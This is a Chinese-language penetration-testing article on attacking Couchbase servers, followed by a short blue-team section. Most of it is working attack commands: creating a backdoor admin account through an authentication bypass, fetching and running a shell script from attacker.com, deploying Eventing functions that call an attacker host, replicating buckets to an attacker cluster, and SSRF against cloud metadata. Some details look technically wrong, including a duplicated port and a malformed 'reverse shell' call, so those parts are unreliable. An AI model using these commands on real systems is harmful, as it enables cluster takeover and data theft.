---
title: "Couchbase REST API / N1QL / Eventing 未授权访问与 RCE 利用技术"
date: 2026-06-21T14:00:00+08:00
draft: false
weight: 98
description: "Couchbase 企业级 NoSQL 数据库渗透测试：REST API 未授权访问、CVE-2022-29171 认证绕过、N1QL 外部函数 RCE、Eventing JavaScript 函数利用与蓝队检测方案"
categories: ["安全", "渗透测试"]
tags: ["Couchbase", "REST API", "N1QL", "Eventing", "CVE-2022-29171", "RCE", "NoSQL", "渗透测试"]
---

## 0x00 攻击面总览

Couchbase 是企业级分布式 NoSQL 数据库，暴露多个服务端口：

| 服务 | 默认端口 | 协议 | 攻击面 |
|------|---------|------|--------|
| Management REST API | 8091 | HTTP/HTTPS | 集群管理、节点管理、Bucket 操作 |
| Query Service (N1QL) | 8093 | HTTP/HTTPS | SQL-like 查询、外部函数执行 |
| Data Service (KV) | 11210 | Memcached binary | 原始数据读写 |
| Index Service | 8095 | HTTP/HTTPS | 索引管理 |
| Search Service (FTS) | 8094 | HTTP/HTTPS | 全文搜索 |
| Eventing Service | 8096 | HTTP/HTTPS | JavaScript 函数部署（RCE） |
| Analytics Service | 8095 | HTTP/HTTPS | SQL++ 分析查询 |

**核心威胁模型**：

```
┌───────────────────────────────────────────────────────────────┐
│                    Couchbase 集群                               │
│                                                               │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐    │
│  │ Management   │    │ Query (N1QL) │    │ Eventing     │    │
│  │ :8091        │    │ :8093        │    │ :8096        │    │
│  │ 集群管理/RCE │    │ SQL 查询/RCE │    │ JS 函数/RCE  │    │
│  └──────┬───────┘    └──────┬───────┘    └──────┬───────┘    │
│         │                   │                    │            │
│  ┌──────┴───────────────────┴────────────────────┴─────────┐ │
│  │              内网 / 数据库专用网络                         │ │
│  │                                                          │ │
│  │  攻击路径：                                               │ │
│  │  ① REST API :8091 → 未授权访问 → 集群接管                 │ │
│  │  ② CVE-2022-29171 → 认证绕过 → 管理员权限                 │ │
│  │  ③ N1QL :8093 → 外部函数 → RCE                           │ │
│  │  ④ Eventing :8096 → JavaScript 函数 → RCE                │ │
│  │  ⑤ XDCR → 数据外传 / SSRF                                │ │
│  └──────────────────────────────────────────────────────────┘ │
│                                                               │
│  默认风险：                                                    │
│  • 管理 API 默认凭据弱/未初始化                                │
│  • CVE-2022-29171 允许未授权访问管理端点                       │
│  • N1QL 支持外部函数执行                                       │
│  • Eventing 服务可部署任意 JavaScript                          │
└───────────────────────────────────────────────────────────────┘
```

---

## 0x01 服务识别与指纹

### 1.1 Nmap 服务发现

```bash
nmap -sV -p 8091,8093,8094,8095,8096,11210 \
  --script=http-title \
  -oN couchbase_scan.txt <target>
```

**典型扫描结果**：

```
PORT     STATE SERVICE     VERSION
8091/tcp open  http        Couchbase Server Management
8093/tcp open  http        Couchbase Query Service
8094/tcp open  http        Couchbase Search Service
8096/tcp open  http        Couchbase Eventing Service
11210/tcp open  memcached   Couchbase Data Service
```

### 1.2 版本指纹

```bash
# 获取集群信息
curl -s "http://target:8091/pools" | python3 -m json.tool

# 响应示例
{
  "pools": [
    {
      "name": "default",
      "uri": "/pools/default",
      "status": "healthy"
    }
  ]
}

# 获取节点信息
curl -s "http://target:8091/pools/default" | python3 -m json.tool
```

### 1.3 Shodan / FOFA 搜索语法

```
# Shodan
http.html:"Couchbase"
port:8091 http.title:"Couchbase"

# FOFA
body="Couchbase" && port="8091"
```

---

## 0x02 CVE-2022-29171 — 认证绕过

### 2.1 漏洞概述

| 属性 | 详情 |
|------|------|
| 影响版本 | Couchbase 6.5.x < 6.5.10, 7.0.x < 7.0.5, 7.1.x < 7.1.3 |
| CVSS | 9.8（Critical） |
| 类型 | 认证绕过 / 访问控制缺陷 |
| 攻击向量 | Management REST API (8091) |
| 根因 | 部分 API 端点未包含在认证强制执行列表中 |

### 2.2 漏洞利用

```bash
# 步骤 1：检查未授权访问
curl -s "http://target:8091/pools/default/buckets"

# 步骤 2：创建管理员用户
curl -s -X POST "http://target:8091/settings/rbac/users/local/backdoor" \
  -d "name=backdoor&password=P@ssw0rd123&roles=admin&comment=backdoor"

# 步骤 3：使用新创建的管理员访问
curl -s -u backdoor:P@ssw0rd123 "http://target:8091/pools/default/buckets" | python3 -m json.tool
```

---

## 0x03 REST API 未授权访问 — 集群接管

### 3.1 默认凭据与初始化

```bash
# 常见默认凭据
# admin:password, admin:admin, admin:123456

# 未初始化节点自动完成设置
curl -s -X POST "http://target:8091/settings/web" \
  -d "username=admin&password=admin123&port=8091"
```

### 3.2 集群信息收集

```bash
# 列出所有 Bucket
curl -s -u admin:admin123 "http://target:8091/pools/default/buckets" | python3 -m json.tool

# 获取节点列表
curl -s -u admin:admin123 "http://target:8091/pools/default/nodes" | python3 -m json.tool

# 获取用户列表
curl -s -u admin:admin123 "http://target:8091/settings/rbac/users" | python3 -m json.tool
```

### 3.3 数据窃取

```bash
# 列出 Bucket 中的文档
curl -s -u admin:admin123 \
  "http://target:8091/pools/default/buckets/default/docs?limit=100" | python3 -m json.tool

# 读取特定文档
curl -s -u admin:admin123 \
  "http://target:8091/pools/default/buckets/default/docs/doc_id"
```

---

## 0x04 N1QL 查询服务 — RCE

### 4.1 外部函数执行

```bash
# 通过 N1QL 创建外部 JavaScript UDF
curl -s -u admin:admin123 -X POST "http://target:8093/query/service" \
  -H "Content-Type: application/json" \
  -d '{
    "statement": "CREATE FUNCTION rce() LANGUAGE JAVASCRIPT AS '\''function rce(){var Runtime=Java.type(\"java.lang.Runtime\");var proc=Runtime.getRuntime().exec(\"id\");return proc;}rce();'\''"
  }'

# 执行函数
curl -s -u admin:admin123 -X POST "http://target:8093/query/service" \
  -H "Content-Type: application/json" \
  -d '{"statement": "EXECUTE FUNCTION rce()"}'
```

### 4.2 cbq Shell 命令执行

```bash
# 通过 cbq 工具直接执行系统命令
cbq -u admin -p admin123 -e http://target:8093

# 在 cbq shell 中执行系统命令
\shell id
\shell cat /etc/passwd
\shell wget http://attacker.com/shell.sh -O /tmp/r.sh && bash /tmp/r.sh
```

---

## 0x05 Eventing Service — JavaScript RCE

### 5.1 部署恶意 JavaScript 函数

```bash
# 通过 Eventing REST API 部署恶意函数
curl -s -u admin:admin123 -X POST "http://target:8096/api/v1/functions/backdoor" \
  -H "Content-Type: application/json" \
  -d '{
    "appname": "backdoor",
    "function": "function OnUpdate(doc,meta){var res=curl(\"http://attacker.com/payload\");log(res);}function OnDelete(meta,ctx){}",
    "settings": {
      "dcp_stream_boundary": "everything",
      "deployment_status": true,
      "processing_status": true
    }
  }'
```

### 5.2 持久化 RCE

```bash
# 部署反弹 Shell 函数
curl -s -u admin:admin123 -X POST "http://target:8096/api/v1/functions/shell" \
  -H "Content-Type: application/json" \
  -d '{
    "appname": "reverse_shell",
    "function": "function OnUpdate(doc,meta){curl(\"http://attacker.com:8888/shell.sh|sh\");}function OnDelete(meta,ctx){}",
    "settings": {
      "dcp_stream_boundary": "everything",
      "deployment_status": true,
      "processing_status": true
    }
  }'
```

---

## 0x06 XDCR — 数据外传与 SSRF

### 6.1 创建恶意 XDCR 复制

```bash
# 创建远程集群引用
curl -s -u admin:admin123 -X POST "http://target:8091/pools/default/remoteClusters" \
  -d "name=attacker&hostname=http://attacker.com:8091&username=attacker&password=attacker"

# 创建复制目标
curl -s -u admin:admin123 -X POST "http://target:8091/controller/createReplication" \
  -d "fromBucket=default&toCluster=attacker&toBucket=exfil&replicationType=continuous"
```

### 6.2 SSRF 利用

```bash
# 通过 XDCR 远程集群引用进行 SSRF
curl -s -u admin:admin123 -X POST "http://target:8091/pools/default/remoteClusters" \
  -d "name=internal&hostname=http://169.254.169.254/latest/meta-data/&username=&password="
```

---

## 0x07 历史 CVE 漏洞矩阵

| CVE | 类型 | CVSS | 影响 |
|-----|------|------|------|
| CVE-2022-29171 | 认证绕过 | 9.8 | Management API 未授权访问 |
| CVE-2022-29172 | 信息泄露 | 7.5 | 敏感信息泄露 |
| CVE-2020-29166 | 认证绕过 | 9.8 | RBAC 认证绕过 |
| CVE-2019-10206 | 认证绕过 | 9.8 | 管理 API 认证绕过 |

**CVE-2022-29171 影响范围**：

Couchbase Server 6.5.x < 6.5.10, 7.0.x < 7.0.5, 7.1.x < 7.1.3。攻击者无需认证即可访问管理端点，创建管理员账户实现集群完全接管。

---

## 0x08 蓝队检测方案

### 8.1 网络层检测

```yaml
title: Couchbase Management API 外部访问检测
id: couchbase-mgmt-external-access
status: experimental
description: 检测来自非内网段的 Couchbase 管理 API 访问
logsource:
  category: firewall
detection:
  selection:
    dst_port:
      - 8091
      - 8093
      - 8094
      - 8095
      - 8096
    src_ip|not:
      - "10.0.0.0/8"
      - "172.16.0.0/12"
      - "192.168.0.0/16"
  condition: selection
level: critical
```

### 8.2 审计日志分析

```bash
# 监控用户创建
grep "rbac.*user.*created" /opt/couchbase/var/lib/couchbase/logs/events.log

# 检测异常管理员角色
grep "roles.*admin" /opt/couchbase/var/lib/couchbase/logs/events.log

# 监控外部函数创建
grep -i "CREATE FUNCTION\|EXECUTE FUNCTION" /opt/couchbase/var/lib/couchbase/logs/query.log

# 检测 XDCR 配置变更
grep "createReplication\|remoteClusters" /opt/couchbase/var/lib/couchbase/logs/http_access.log

# 监控证书替换
grep "uploadClusterCA\|reloadCertificate" /opt/couchbase/var/lib/couchbase/logs/http_access.log
```

### 8.3 加固清单

```
[ ] 升级至 Couchbase >= 7.1.3 / 7.0.5 / 6.5.10（修复 CVE-2022-29171）
[ ] 设置强密码管理员账户
[ ] Management REST API (8091) 仅允许内网访问
[ ] 配置防火墙规则限制所有 Couchbase 端口访问源
[ ] 启用审计日志：settings/audit
[ ] 启用集群加密
[ ] 仅启用必要的服务（kv, n1ql 等）
[ ] 定期审查 RBAC 用户列表
[ ] 验证 XDCR 配置无异常复制目标
[ ] 验证 TLS 证书链完整性
[ ] 在前面放置反向代理并启用认证
[ ] 监控 N1QL 查询中的异常外部函数调用
[ ] 监控 Eventing 服务中的异常 JavaScript 函数部署
[ ] 将审计日志接入 SIEM
```

---

## 0x09 渗透测试检查清单

```
[ ] 端口扫描：8091, 8093, 8094, 8095, 8096, 11210
[ ] Management REST API (8091) 未授权访问测试
[ ] CVE-2022-29171 认证绕过测试
[ ] 默认凭据测试
[ ] 集群信息收集（pools, buckets, nodes）
[ ] 用户枚举（RBAC users）
[ ] 数据窃取测试（Bucket 文档读取）
[ ] N1QL 查询服务 (8093) 未授权访问测试
[ ] N1QL 外部函数 RCE 测试
[ ] Eventing 服务 (8096) JavaScript 函数部署测试
[ ] XDCR 数据外传测试
[ ] XDCR SSRF 测试
[ ] 管理员用户创建测试
[ ] 认证配置检查
[ ] TLS/SSL 配置检查
```

---

## 0x10 小结

Couchbase 的攻击面以 **Management REST API（端口 8091）** 为核心。**CVE-2022-29171**（CVSS 9.8）允许未授权访问管理端点，攻击者可以创建管理员账户实现集群完全接管。获得管理员权限后，可通过 N1QL 外部函数执行、Eventing JavaScript 函数部署实现 RCE，通过 XDCR 实现数据外传和 SSRF。蓝队应重点关注：升级至修复版本、设置强密码、限制管理 API 网络访问、启用审计日志、将审计日志接入 SIEM。
